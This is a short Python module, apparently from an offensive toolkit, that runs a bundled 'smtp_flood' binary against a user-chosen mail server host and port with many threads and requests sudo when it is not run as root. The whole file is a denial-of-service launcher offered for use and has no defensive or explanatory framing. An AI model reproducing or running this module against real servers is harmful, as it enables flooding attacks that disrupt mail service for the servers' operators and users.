import subprocess
import os
from rootmap import ROOT

REQUIRED_OPTIONS = {
    "HOSTNAME": "ex: mail.storm.com",
    "PORT": "ex: 25",
    "THREAD": "ex: 1000",
}


def execute(options):
    target = str(options.get("HOSTNAME"))
    port = str(options.get("PORT"))
    threads = str(options.get("THREAD"))

    bindir = os.path.join(ROOT, "external", "source", "binary")
    bin_path = os.path.join(bindir, "smtp_flood")
    if not target:
        print("[-] Target is missing!")
        return

    if not os.path.exists(bin_path):
        return

    if os.getuid() == 0:
        command = [bin_path, "-t", target, "-p", port, "-w", threads]
    else:
        print("[!] This module requires root. Requesting sudo...")
        command = ["sudo", bin_path, "-t", target, "-p", port, "-w", threads]

    print(f"[*] Starting SMTP Flood on {target}")
    try:
        process = subprocess.Popen(command, stdout=None, stderr=None)
        process.wait()
    except KeyboardInterrupt:
        process.terminate()
        print("\n[!] SMTP Flood stopped.")
